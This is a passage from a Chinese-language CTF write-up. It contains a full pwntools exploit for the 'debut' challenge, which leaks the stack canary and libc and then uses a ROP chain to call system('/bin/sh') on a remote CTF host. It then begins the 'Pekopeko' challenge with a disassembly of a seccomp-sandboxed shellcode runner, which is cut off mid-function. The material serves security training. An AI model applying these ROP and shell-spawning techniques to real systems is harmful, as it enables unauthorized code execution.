6. 處理完上方所有事項後，從Libc裡找出 b“/bin/sh”和 system位置，然後依次序塞			到輸入裡就是了(記得要放Canary)。

7.payload
```python
from pwn import *

stream = b"\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shopping = b"\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buy1 = b"B1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buy2 = b"B2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buy3 = b"B3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buy4 = b"B4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buy5 = b"B5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
set_fan = b"\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
sell = b's-99999999999999\x00'

#p = process("./debut")
p = remote('ctf.adl.tw', 10006)
elf = ELF("./debut")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pause()
payload = flat(b"David")
p.sendlineafter(b"your vTuber life\n", payload)
#####################Code-offset##########################
payload = flat(shopping, sell, shopping, buy1, shopping, buy2, shopping, buy3,shopping, buy4, shopping, buy5, stream, set_fan, cyclic(8))
p.sendlineafter(b"exit\n", payload)
p.recvuntil(cyclic(8)+b"\n")
code_offset = u64(p.recv(7).rjust(8, b"\x00"))
# 0xXXXXcode_offset -> 0x0000code_offset
code_offset = code_offset % (16**13)
#  code_offset in 1300 查 obj 查來的
code_offset = code_offset - 0x1300
print("Code_offset is :", hex(code_offset))
##########################################################
#######################Canary#############################
pause()
payload = flat(b"n", cyclic(41))
# p.sendlineafter(b"\n",payload)
p.send(payload)

p.recvuntil(cyclic(41))
canary = u64(p.recv(7).rjust(8, b"\x00"))
print("Canary is :", hex(canary))
###########################################################
#####################Libc-offset###########################
pop_rdi = 0x0000000000001cc3 + code_offset
# 最後要回到 set_fan_name
set_fan_name = 0x0000000000001a70 + code_offset

pause()
payload = flat(b"n", cyclic(40), p64(canary), cyclic(8), p64(pop_rdi),
               p64(elf.got['puts'] +
                   code_offset), p64(elf.plt['puts']+code_offset),
               p64(set_fan_name))
p.send(payload)

pause()
payload = flat(b"y")
p.send(payload)
p.recvuntil(b'success\n')
puts = u64(p.recvline().strip().ljust(8, b"\x00"))
# or - 554400
libc_offset = puts - libc.sym['puts']
print("Libc_offset is :", hex(libc_offset))
###########################################################
#####################Get-Shell#############################
bin_address = next(libc.search(b'/bin/sh')) + libc_offset
system = libc.sym['system'] + libc_offset
# 避免 rsp 沒對齊
ret = 0x000000000000101a + code_offset
pause()
payload = flat(cyclic(40), p64(canary), cyclic(8),
               p64(pop_rdi), p64(bin_address), p64(ret), p64(system))
p.send(payload)
###########################################################
pause()
p.send(b'y')
p.interactive()
p.close()
# cd /home/"debut"/flag
# cat /home/"debut"/flag
# ADL{你有看過feat百鬼的台V嗎沒有的話趕快點進去看https://www.youtube.com/watch?v=nBlnWJUFAzI#t=244}
```

 
## Pekopeko

<details>
<summary>source code</summary>

```x86asm

pekopeko:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    rsp,0x8
  401008:	48 8b 05 e9 4f 00 00 	mov    rax,QWORD PTR [rip+0x4fe9]        # 405ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   rax,rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   rax
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:	ff 35 e2 4f 00 00    	push   QWORD PTR [rip+0x4fe2]        # 406008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	f2 ff 25 e3 4f 00 00 	bnd jmp QWORD PTR [rip+0x4fe3]        # 406010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:	0f 1f 00             	nop    DWORD PTR [rax]
  401030:	f3 0f 1e fa          	endbr64 
  401034:	68 00 00 00 00       	push   0x0
  401039:	f2 e9 e1 ff ff ff    	bnd jmp 401020 <.plt>
  40103f:	90                   	nop
  401040:	f3 0f 1e fa          	endbr64 
  401044:	68 01 00 00 00       	push   0x1
  401049:	f2 e9 d1 ff ff ff    	bnd jmp 401020 <.plt>
  40104f:	90                   	nop
  401050:	f3 0f 1e fa          	endbr64 
  401054:	68 02 00 00 00       	push   0x2
  401059:	f2 e9 c1 ff ff ff    	bnd jmp 401020 <.plt>
  40105f:	90                   	nop
  401060:	f3 0f 1e fa          	endbr64 
  401064:	68 03 00 00 00       	push   0x3
  401069:	f2 e9 b1 ff ff ff    	bnd jmp 401020 <.plt>
  40106f:	90                   	nop
  401070:	f3 0f 1e fa          	endbr64 
  401074:	68 04 00 00 00       	push   0x4
  401079:	f2 e9 a1 ff ff ff    	bnd jmp 401020 <.plt>
  40107f:	90                   	nop
  401080:	f3 0f 1e fa          	endbr64 
  401084:	68 05 00 00 00       	push   0x5
  401089:	f2 e9 91 ff ff ff    	bnd jmp 401020 <.plt>
  40108f:	90                   	nop
  401090:	f3 0f 1e fa          	endbr64 
  401094:	68 06 00 00 00       	push   0x6
  401099:	f2 e9 81 ff ff ff    	bnd jmp 401020 <.plt>
  40109f:	90                   	nop
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	68 07 00 00 00       	push   0x7
  4010a9:	f2 e9 71 ff ff ff    	bnd jmp 401020 <.plt>
  4010af:	90                   	nop
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	68 08 00 00 00       	push   0x8
  4010b9:	f2 e9 61 ff ff ff    	bnd jmp 401020 <.plt>
  4010bf:	90                   	nop

Disassembly of section .plt.sec:

00000000004010c0 <seccomp_init@plt>:
  4010c0:	f3 0f 1e fa          	endbr64 
  4010c4:	f2 ff 25 4d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f4d]        # 406018 <seccomp_init>
  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010d0 <strncmp@plt>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	f2 ff 25 45 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f45]        # 406020 <strncmp@GLIBC_2.2.5>
  4010db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010e0 <seccomp_rule_add@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 3d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f3d]        # 406028 <seccomp_rule_add>
  4010eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <puts@plt>:
  4010f0:	f3 0f 1e fa          	endbr64 
  4010f4:	f2 ff 25 35 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f35]        # 406030 <puts@GLIBC_2.2.5>
  4010fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <seccomp_load@plt>:
  401100:	f3 0f 1e fa          	endbr64 
  401104:	f2 ff 25 2d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f2d]        # 406038 <seccomp_load>
  40110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401110 <read@plt>:
  401110:	f3 0f 1e fa          	endbr64 
  401114:	f2 ff 25 25 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f25]        # 406040 <read@GLIBC_2.2.5>
  40111b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401120 <setvbuf@plt>:
  401120:	f3 0f 1e fa          	endbr64 
  401124:	f2 ff 25 1d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f1d]        # 406048 <setvbuf@GLIBC_2.2.5>
  40112b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401130 <__isoc99_scanf@plt>:
  401130:	f3 0f 1e fa          	endbr64 
  401134:	f2 ff 25 15 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f15]        # 406050 <__isoc99_scanf@GLIBC_2.7>
  40113b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401140 <exit@plt>:
  401140:	f3 0f 1e fa          	endbr64 
  401144:	f2 ff 25 0d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f0d]        # 406058 <exit@GLIBC_2.2.5>
  40114b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401150 <_start>:
  401150:	f3 0f 1e fa          	endbr64 
  401154:	31 ed                	xor    ebp,ebp
  401156:	49 89 d1             	mov    r9,rdx
  401159:	5e                   	pop    rsi
  40115a:	48 89 e2             	mov    rdx,rsp
  40115d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  401161:	50                   	push   rax
  401162:	54                   	push   rsp
  401163:	49 c7 c0 c0 16 40 00 	mov    r8,0x4016c0
  40116a:	48 c7 c1 50 16 40 00 	mov    rcx,0x401650
  401171:	48 c7 c7 f3 14 40 00 	mov    rdi,0x4014f3
  401178:	ff 15 72 4e 00 00    	call   QWORD PTR [rip+0x4e72]        # 405ff0 <__libc_start_main@GLIBC_2.2.5>
  40117e:	f4                   	hlt    
  40117f:	90                   	nop

0000000000401180 <_dl_relocate_static_pie>:
  401180:	f3 0f 1e fa          	endbr64 
  401184:	c3                   	ret    
  401185:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40118c:	00 00 00 
  40118f:	90                   	nop

0000000000401190 <deregister_tm_clones>:
  401190:	b8 70 60 40 00       	mov    eax,0x406070
  401195:	48 3d 70 60 40 00    	cmp    rax,0x406070
  40119b:	74 13                	je     4011b0 <deregister_tm_clones+0x20>
  40119d:	b8 00 00 00 00       	mov    eax,0x0
  4011a2:	48 85 c0             	test   rax,rax
  4011a5:	74 09                	je     4011b0 <deregister_tm_clones+0x20>
  4011a7:	bf 70 60 40 00       	mov    edi,0x406070
  4011ac:	ff e0                	jmp    rax
  4011ae:	66 90                	xchg   ax,ax
  4011b0:	c3                   	ret    
  4011b1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011b8:	00 00 00 00 
  4011bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011c0 <register_tm_clones>:
  4011c0:	be 70 60 40 00       	mov    esi,0x406070
  4011c5:	48 81 ee 70 60 40 00 	sub    rsi,0x406070
  4011cc:	48 89 f0             	mov    rax,rsi
  4011cf:	48 c1 ee 3f          	shr    rsi,0x3f
  4011d3:	48 c1 f8 03          	sar    rax,0x3
  4011d7:	48 01 c6             	add    rsi,rax
  4011da:	48 d1 fe             	sar    rsi,1
  4011dd:	74 11                	je     4011f0 <register_tm_clones+0x30>
  4011df:	b8 00 00 00 00       	mov    eax,0x0
  4011e4:	48 85 c0             	test   rax,rax
  4011e7:	74 07                	je     4011f0 <register_tm_clones+0x30>
  4011e9:	bf 70 60 40 00       	mov    edi,0x406070
  4011ee:	ff e0                	jmp    rax
  4011f0:	c3                   	ret    
  4011f1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011f8:	00 00 00 00 
  4011fc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401200 <__do_global_dtors_aux>:
  401200:	f3 0f 1e fa          	endbr64 
  401204:	80 3d 9d 4e 00 00 00 	cmp    BYTE PTR [rip+0x4e9d],0x0        # 4060a8 <completed.0>
  40120b:	75 13                	jne    401220 <__do_global_dtors_aux+0x20>
  40120d:	55                   	push   rbp
  40120e:	48 89 e5             	mov    rbp,rsp
  401211:	e8 7a ff ff ff       	call   401190 <deregister_tm_clones>
  401216:	c6 05 8b 4e 00 00 01 	mov    BYTE PTR [rip+0x4e8b],0x1        # 4060a8 <completed.0>
  40121d:	5d                   	pop    rbp
  40121e:	c3                   	ret    
  40121f:	90                   	nop
  401220:	c3                   	ret    
  401221:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401228:	00 00 00 00 
  40122c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401230 <frame_dummy>:
  401230:	f3 0f 1e fa          	endbr64 
  401234:	eb 8a                	jmp    4011c0 <register_tm_clones>

0000000000401236 <init>:
  401236:	f3 0f 1e fa          	endbr64 
  40123a:	55                   	push   rbp
  40123b:	48 89 e5             	mov    rbp,rsp
  40123e:	48 8b 05 4b 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e4b]        # 406090 <stdin@@GLIBC_2.2.5>
  401245:	b9 00 00 00 00       	mov    ecx,0x0
  40124a:	ba 02 00 00 00       	mov    edx,0x2
  40124f:	be 00 00 00 00       	mov    esi,0x0
  401254:	48 89 c7             	mov    rdi,rax
  401257:	e8 c4 fe ff ff       	call   401120 <setvbuf@plt>
  40125c:	48 8b 05 1d 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e1d]        # 406080 <stdout@@GLIBC_2.2.5>
  401263:	b9 00 00 00 00       	mov    ecx,0x0
  401268:	ba 02 00 00 00       	mov    edx,0x2
  40126d:	be 00 00 00 00       	mov    esi,0x0
  401272:	48 89 c7             	mov    rdi,rax
  401275:	e8 a6 fe ff ff       	call   401120 <setvbuf@plt>
  40127a:	48 8b 05 1f 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e1f]        # 4060a0 <stderr@@GLIBC_2.2.5>
  401281:	b9 00 00 00 00       	mov    ecx,0x0
  401286:	ba 02 00 00 00       	mov    edx,0x2
  40128b:	be 00 00 00 00       	mov    esi,0x0
  401290:	48 89 c7             	mov    rdi,rax
  401293:	e8 88 fe ff ff       	call   401120 <setvbuf@plt>
  401298:	90                   	nop
  401299:	5d                   	pop    rbp
  40129a:	c3                   	ret    

000000000040129b <init_seccomp>:
  40129b:	f3 0f 1e fa          	endbr64 
  40129f:	55                   	push   rbp
  4012a0:	48 89 e5             	mov    rbp,rsp
  4012a3:	48 83 ec 10          	sub    rsp,0x10
  4012a7:	bf 00 00 00 00       	mov    edi,0x0
  4012ac:	e8 0f fe ff ff       	call   4010c0 <seccomp_init@plt>
  4012b1:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4012b5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012b9:	b9 00 00 00 00       	mov    ecx,0x0
  4012be:	ba 02 00 00 00       	mov    edx,0x2
  4012c3:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  4012c8:	48 89 c7             	mov    rdi,rax
  4012cb:	b8 00 00 00 00       	mov    eax,0x0
  4012d0:	e8 0b fe ff ff       	call   4010e0 <seccomp_rule_add@plt>
  4012d5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012d9:	b9 00 00 00 00       	mov    ecx,0x0
  4012de:	ba 00 00 00 00       	mov    edx,0x0
  4012e3:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  4012e8:	48 89 c7             	mov    rdi,rax
  4012eb:	b8 00 00 00 00       	mov    eax,0x0
  4012f0:	e8 eb fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  4012f5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012f9:	b9 00 00 00 00       	mov    ecx,0x0
  4012fe:	ba 3c 00 00 00       	mov    edx,0x3c
  401303:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  401308:	48 89 c7             	mov    rdi,rax
  40130b:	b8 00 00 00 00       	mov    eax,0x0
  401310:	e8 cb fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  401315:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401319:	b9 00 00 00 00       	mov    ecx,0x0
  40131e:	ba e7 00 00 00       	mov    edx,0xe7
  401323:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  401328:	48 89 c7             	mov    rdi,rax
  40132b:	b8 00 00 00 00       	mov    eax,0x0
  401330:	e8 ab fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  401335:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401339:	48 89 c7             	mov    rdi,rax
  40133c:	e8 bf fd ff ff       	call   401100 <seccomp_load@plt>
  401341:	90                   	nop
  401342:	c9                   	leave  
  401343:	c3                   	ret    

0000000000401344 <banner>:
  401344:	f3 0f 1e fa          	endbr64 
  401348:	55                   	push   rbp
  401349:	48 89 e5             	mov    rbp,rsp
  40134c:	48 8d 3d b5 0c 00 00 	lea    rdi,[rip+0xcb5]        # 402008 <_IO_stdin_used+0x8>
  401353:	e8 98 fd ff ff       	call   4010f0 <puts@plt>
  401358:	48 8d 3d 81 0d 00 00 	lea    rdi,[rip+0xd81]        # 4020e0 <_IO_stdin_used+0xe0>
  40135f:	e8 8c fd ff ff       	call   4010f0 <puts@plt>
  401364:	48 8d 3d 4d 0e 00 00 	lea    rdi,[rip+0xe4d]        # 4021b8 <_IO_stdin_used+0x1b8>
  40136b:	e8 80 fd ff ff       	call   4010f0 <puts@plt>
  401370:	48 8d 3d 19 0f 00 00 	lea    rdi,[rip+0xf19]        # 402290 <_IO_stdin_used+0x290>
  401377:	e8 74 fd ff ff       	call   4010f0 <puts@plt>
  40137c:	48 8d 3d e5 0f 00 00 	lea    rdi,[rip+0xfe5]        # 402368 <_IO_stdin_used+0x368>
  401383:	e8 68 fd ff ff       	call   4010f0 <puts@plt>
  401388:	48 8d 3d b1 10 00 00 	lea    rdi,[rip+0x10b1]        # 402440 <_IO_stdin_used+0x440>
  40138f:	e8 5c fd ff ff       	call   4010f0 <puts@plt>
  401394:	48 8d 3d 7d 11 00 00 	lea    rdi,[rip+0x117d]        # 402518 <_IO_stdin_used+0x518>
  40139b:	e8 50 fd ff ff       	call   4010f0 <puts@plt>
  4013a0:	48 8d 3d 49 12 00 00 	lea    rdi,[rip+0x1249]        # 4025f0 <_IO_stdin_used+0x5f0>
  4013a7:	e8 44 fd ff ff       	call   4010f0 <puts@plt>
  4013ac:	48 8d 3d 15 13 00 00 	lea    rdi,[rip+0x1315]        # 4026c8 <_IO_stdin_used+0x6c8>
  4013b3:	e8 38 fd ff ff       	call   4010f0 <puts@plt>
  4013b8:	48 8d 3d e1 13 00 00 	lea    rdi,[rip+0x13e1]        # 4027a0 <_IO_stdin_used+0x7a0>
  4013bf:	e8 2c fd ff ff       	call   4010f0 <puts@plt>
  4013c4:	48 8d 3d ad 14 00 00 	lea    rdi,[rip+0x14ad]        # 402878 <_IO_stdin_used+0x878>
  4013cb:	e8 20 fd ff ff       	call   4010f0 <puts@plt>
  4013d0:	48 8d 3d 79 15 00 00 	lea    rdi,[rip+0x1579]        # 402950 <_IO_stdin_used+0x950>
  4013d7:	e8 14 fd ff ff       	call   4010f0 <puts@plt>
  4013dc:	48 8d 3d 45 16 00 00 	lea    rdi,[rip+0x1645]        # 402a28 <_IO_stdin_used+0xa28>
  4013e3:	e8 08 fd ff ff       	call   4010f0 <puts@plt>
  4013e8:	48 8d 3d 11 17 00 00 	lea    rdi,[rip+0x1711]        # 402b00 <_IO_stdin_used+0xb00>
  4013ef:	e8 fc fc ff ff       	call   4010f0 <puts@plt>
  4013f4:	48 8d 3d dd 17 00 00 	lea    rdi,[rip+0x17dd]        # 402bd8 <_IO_stdin_used+0xbd8>
  4013fb:	e8 f0 fc ff ff       	call   4010f0 <puts@plt>
  401400:	48 8d 3d a9 18 00 00 	lea    rdi,[rip+0x18a9]        # 402cb0 <_IO_stdin_used+0xcb0>
  401407:	e8 e4 fc ff ff       	call   4010f0 <puts@plt>
  40140c:	48 8d 3d 75 19 00 00 	lea    rdi,[rip+0x1975]        # 402d88 <_IO_stdin_used+0xd88>
  401413:	e8 d8 fc ff ff       	call   4010f0 <puts@plt>
  401418:	48 8d 3d 41 1a 00 00 	lea    rdi,[rip+0x1a41]        # 402e60 <_IO_stdin_used+0xe60>
  40141f:	e8 cc fc ff ff       	call   4010f0 <puts@plt>
  401424:	48 8d 3d 0d 1b 00 00 	lea    rdi,[rip+0x1b0d]        # 402f38 <_IO_stdin_used+0xf38>
  40142b:	e8 c0 fc ff ff       	call   4010f0 <puts@plt>
  401430:	48 8d 3d d9 1b 00 00 	lea    rdi,[rip+0x1bd9]        # 403010 <_IO_stdin_used+0x1010>
  401437:	e8 b4 fc ff ff       	call   4010f0 <puts@plt>
  40143c:	48 8d 3d a5 1c 00 00 	lea    rdi,[rip+0x1ca5]        # 4030e8 <_IO_stdin_used+0x10e8>
  401443:	e8 a8 fc ff ff       	call   4010f0 <puts@plt>
  401448:	48 8d 3d 71 1d 00 00 	lea    rdi,[rip+0x1d71]        # 4031c0 <_IO_stdin_used+0x11c0>
  40144f:	e8 9c fc ff ff       	call   4010f0 <puts@plt>
  401454:	48 8d 3d 3d 1e 00 00 	lea    rdi,[rip+0x1e3d]        # 403298 <_IO_stdin_used+0x1298>
  40145b:	e8 90 fc ff ff       	call   4010f0 <puts@plt>
  401460:	48 8d 3d 09 1f 00 00 	lea    rdi,[rip+0x1f09]        # 403370 <_IO_stdin_used+0x1370>
  401467:	e8 84 fc ff ff       	call   4010f0 <puts@plt>
  40146c:	48 8d 3d d5 1f 00 00 	lea    rdi,[rip+0x1fd5]        # 403448 <_IO_stdin_used+0x1448>
  401473:	e8 78 fc ff ff       	call   4010f0 <puts@plt>
  401478:	48 8d 3d a1 20 00 00 	lea    rdi,[rip+0x20a1]        # 403520 <_IO_stdin_used+0x1520>
  40147f:	e8 6c fc ff ff       	call   4010f0 <puts@plt>
  401484:	48 8d 3d 6d 21 00 00 	lea    rdi,[rip+0x216d]        # 4035f8 <_IO_stdin_used+0x15f8>
  40148b:	e8 60 fc ff ff       	call   4010f0 <puts@plt>
  401490:	48 8d 3d 39 22 00 00 	lea    rdi,[rip+0x2239]        # 4036d0 <_IO_stdin_used+0x16d0>
  401497:	e8 54 fc ff ff       	call   4010f0 <puts@plt>
  40149c:	48 8d 3d 05 23 00 00 	lea    rdi,[rip+0x2305]        # 4037a8 <_IO_stdin_used+0x17a8>
  4014a3:	e8 48 fc ff ff       	call   4010f0 <puts@plt>
  4014a8:	48 8d 3d d1 23 00 00 	lea    rdi,[rip+0x23d1]        # 403880 <_IO_stdin_used+0x1880>
  4014af:	e8 3c fc ff ff       	call   4010f0 <puts@plt>
  4014b4:	48 8d 3d 9d 24 00 00 	lea    rdi,[rip+0x249d]        # 403958 <_IO_stdin_used+0x1958>
  4014bb:	e8 30 fc ff ff       	call   4010f0 <puts@plt>
  4014c0:	48 8d 3d 69 25 00 00 	lea    rdi,[rip+0x2569]        # 403a30 <_IO_stdin_used+0x1a30>
  4014c7:	e8 24 fc ff ff       	call   4010f0 <puts@plt>
  4014cc:	48 8d 3d 35 26 00 00 	lea    rdi,[rip+0x2635]        # 403b08 <_IO_stdin_used+0x1b08>
  4014d3:	e8 18 fc ff ff       	call   4010f0 <puts@plt>
  4014d8:	48 8d 3d 01 27 00 00 	lea    rdi,[rip+0x2701]        # 403be0 <_IO_stdin_used+0x1be0>
  4014df:	e8 0c fc ff ff       	call   4010f0 <puts@plt>
  4014e4:	48 8d 3d cd 27 00 00 	lea    rdi,[rip+0x27cd]        # 403cb8 <_IO_stdin_used+0x1cb8>
  4014eb:	e8 00 fc ff ff       	call   4010f0 <puts@plt>
  4014f0:	90                   	nop
  4014f1:	5d                   	pop    rbp
  4014f2:	c3                   	ret    

00000000004014f3 <main>:
  4014f3:	f3 0f 1e fa          	endbr64 
  4014f7:	55                   	push   rbp
  4014f8:	48 89 e5             	mov    rbp,rsp
  4014fb:	48 83 ec 60          	sub    rsp,0x60
  4014ff:	b8 00 00 00 00       	mov    eax,0x0
  401504:	e8 2d fd ff ff       	call   401236 <init>
  401509:	b8 00 00 00 00       	mov    eax,0x0
  40150e:	e8 31 fe ff ff       	call   401344 <banner>
  401513:	48 b8 70 65 6b 6f 70 	movabs rax,0x6f6b65706f6b6570
  40151a:	65 6b 6f 
  40151d:	48 ba 70 65 6b 6f 70 	movabs rdx,0x6f6b65706f6b6570
  401524:	65 6b 6f 
  401527:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  40152b:	48 89 55 a8          	mov    QWORD PTR [rbp-0x58],rdx
  40152f:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401533:	48 89 55 b8          	mov    QWORD PTR [rbp-0x48],rdx
  401537:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  40153b:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  40153f:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401543:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  401547:	c6 45 e0 00          	mov    BYTE PTR [rbp-0x20],0x0
  40154b:	48 8d 3d 3e 28 00 00 	lea    rdi,[rip+0x283e]        # 403d90 <_IO_stdin_used+0x1d90>
  401552:	e8 99 fb ff ff       	call   4010f0 <puts@plt>
  401557:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  40155b:	48 89 c6             	mov    rsi,rax
  40155e:	48 8d 3d 58 28 00 00 	lea    rdi,[rip+0x2858]        # 403dbd <_IO_stdin_used+0x1dbd>
  401565:	b8 00 00 00 00       	mov    eax,0x0
  40156a:	e8 c1 fb ff ff       	call   401130 <__isoc99_scanf@plt>
  40156f:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  401573:	ba 03 00 00 00       	mov    edx,0x3
  401578:	48 8d 35 42 28 00 00 	lea    rsi,[rip+0x2842]        # 403dc1 <_IO_stdin_used+0x1dc1>
  40157f:	48 89 c7             	mov    rdi,rax
  401582:	e8 49 fb ff ff       	call   4010d0 <strncmp@plt>
  401587:	85 c0                	test   eax,eax
  401589:	74 16                	je     4015a1 <main+0xae>
  40158b:	48 8d 3d 33 28 00 00 	lea    rdi,[rip+0x2833]        # 403dc5 <_IO_stdin_used+0x1dc5>
  401592:	e8 59 fb ff ff       	call   4010f0 <puts@plt>
  401597:	bf 00 00 00 00       	mov    edi,0x0
  40159c:	e8 9f fb ff ff       	call   401140 <exit@plt>
  4015a1:	48 8d 3d 2a 28 00 00 	lea    rdi,[rip+0x282a]        # 403dd2 <_IO_stdin_used+0x1dd2>
  4015a8:	e8 43 fb ff ff       	call   4010f0 <puts@plt>
  4015ad:	b8 00 00 00 00       	mov    eax,0x0
  4015b2:	e8 e4 fc ff ff       	call   40129b <init_seccomp>
  4015b7:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  4015bb:	ba 40 00 00 00       	mov    edx,0x40
  4015c0:	48 89 c6             	mov    rsi,rax
  4015c3:	bf 00 00 00 00       	mov    edi,0x0
  4015c8:	b8 00 00 00 00       	mov    eax,0x0
  4015cd:	e8 3e fb ff ff       	call   401110 <read@plt>
  4015d2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4015d9:	eb 4c                	jmp    401627 <main+0x134>
  4015db:	8b 4d fc             	mov    ecx,DWORD PTR [rbp-0x4]
  4015de:	48 63 c1             	movsxd rax,ecx
  4015e1:	48 69 c0 e9 a2 8b 2e 	imul   rax,rax,0x2e8ba2e9
  4015e8:	48 c1 e8 20          	shr    rax,0x20
  4015ec:	d1 f8                	sar    eax,1
  4015ee:	89 ce                	mov    esi,ecx
  4015f0:	c1 fe 1f             	sar    esi,0x1f
  4015f3:	29 f0                	sub    eax,esi
  4015f5:	89 c2                	mov    edx,eax
  4015f7:	89 d0                	mov    eax,edx
  4015f9:	c1 e0 02             	shl    eax,0x2
  4015fc:	01 d0                	add    eax,edx
  4015fe:	01 c0                	add    eax,eax
  401600:	01 d0                	add    eax,edx
  401602:	29 c1                	sub    ecx,eax
  401604:	89 ca                	mov    edx,ecx
  401606:	83 fa 05             	cmp    edx,0x5
  401609:	75 18                	jne    401623 <main+0x130>
  40160b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40160e:	48 98                	cdqe   
  401610:	0f b6 44 05 a0       	movzx  eax,BYTE PTR [rbp+rax*1-0x60]
  401615:	3c 87                	cmp    al,0x87
  401617:	74 0a                	je     401623 <main+0x130>
  401619:	bf 00 00 00 00       	mov    edi,0x0
  40161e:	e8 1d fb ff ff       	call   401140 <exit@plt>
  401623:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401627:	83 7d fc 3f          	cmp    DWORD PTR [rbp-0x4],0x3f
  40162b:	7e ae                	jle    4015db <main+0xe8>
  40162d:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  401631:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  401635:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  401639:	b8 00 00 00 00       	mov    eax,0x0
  40163e:	ff d2                	call   rdx
  401640:	b8 00 00 00 00       	mov    eax,0x0
  401645:	c9                   	leave  
  401646:	c3                   	ret    
  401647:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
  40164e:	00 00 

0000000000401650 <__libc_csu_init>:
  401650:	f3 0f 1e fa          	endbr64 
  401654:	41 57                	push   r15
  401656:	4c 8d 3d a3 47 00 00 	lea    r15,[rip+0x47a3]        # 405e00 <__frame_dummy_init_array_entry>
  40165d:	41 56                	push   r14
  40165f:	49 89 d6             	mov    r14,rdx
  401662:	41 55                	push   r13
  401664:	49 89 f5             	mov    r13,rsi
  401667:	41 54                	push   r12
